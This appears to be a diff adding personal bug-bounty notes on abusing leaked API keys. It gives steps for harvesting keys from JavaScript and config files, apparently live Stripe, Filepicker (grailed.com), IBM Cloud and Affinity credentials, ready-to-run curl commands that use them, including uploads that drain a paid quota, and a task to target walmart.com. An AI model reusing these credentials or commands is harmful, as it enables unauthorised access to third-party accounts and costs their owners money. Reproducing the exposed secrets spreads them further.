@@ -1,0 +1,115 @@
+API exploit
+
+1. Not every key is issue
+2. Without exploit dont report
+3. Curl is best option
+
+
+API docs 
+
+
+1. Org based
+2. Service based
+
+Tesla have own APIs
+
+Samsung using Razorpay APIs
+
+Zomato using own api  org based
+
+Agri10x using APIs of razorpay
+
+
+Exploit and reading
+
+1. 
+Github , Js files , Source Code , Response etc
+
+2. 
+Exploit 
+
+API reading
+
+zoho
+insta
+swiggy
+ably
+zomato
+alibaba
+
+
+
+1. your_target api docs curl
+2. inurl:"https://documenter.getpostman.com/" walmart
+
+
+
+
+stripe_publishable_key":"pk_live_51Jm0mwCQkFi8IKk8Eunrm30ZgVokGlnbINVg7J61t75KrDhUHRQA9qrPYqVAI6ggd9Kiwy5aIXJLaQO1a1mmgTBy00oYFIrhOU"
+
+
+"filepicker_conversion_url":"https://process.fs.grailed.com","filepicker_key":"AJdAgnqCST4iPtnUxiGtTz"
+
+target: grailed.com
+api : filepicker
+
+
+curl -X POST \
+    -d url="https://events.eurid.eu/media/upload/tedex_2012-2692.jpg" \
+    "https://process.fs.grailed.com/api/store/S3?key=AJdAgnqCST4iPtnUxiGtTz"
+
+    1. Service based : API req it asks money
+    2. We can upload any bad image
+    3. Multiple time : API key can get exhausted
+    4. Exif Vuln
+
+
+
+    Steps:
+1. gau grailed.com | grep config
+2. Cntrl + F = key
+3. Fileicker key
+4. Fileicker api docs (target api docs)
+5. Curl 
+6. Manually check all 
+7. File upload CURL
+8. Used API key , Upload image 
+9. Escalation issue :Exif issue
+10 Good to report
+
+
+curl -k -X {request_method} -u "apikey:AgOvNjeKYkIS_GqSXSl1TXxiGEAm875Q3wiB_i7LM5WH" "https://jp-tok.ml.cloud.ibm.com/{method}"
+
+
+    "apikey": "AgOvNjeKYkIS_GqSXSl1TXxiGEAm875Q3wiB_i7LM5WH",
+    "url": "https://jp-tok.ml.cloud.ibm.com"
+
+
+    curl -X GET -u "apikey:AgOvNjeKYkIS_GqSXSl1TXxiGEAm875Q3wiB_i7LM5WH" "https://api.us-south.assistant.watson.cloud.ibm.com/instances/jp-tok.ml.cloud.ibm.com"
+
+
+
+
+
+curl "https://api.affinity.co/lists" -u :
+
+
+curl "https://api.affinity.co/organizations?term=affinity" -u :4kjy1CyQWhdXRxr7pIZqOj65mMJ6IRQFPsCVOzaNPI
+
+
+
+
+1. Find info dis issue : key
+2. Check org based or service based
+3. Org based : target api docs curl = uber api docs curl
+4. Service based : service api docs curl = amazon api docs curl
+5. Check of curl command 
+6. Exchange key values = IF info is sensetive then report 
+
+
+
+
+
+Task: Find token in walmart.com
+Find walmart API docs
+Try to exploit
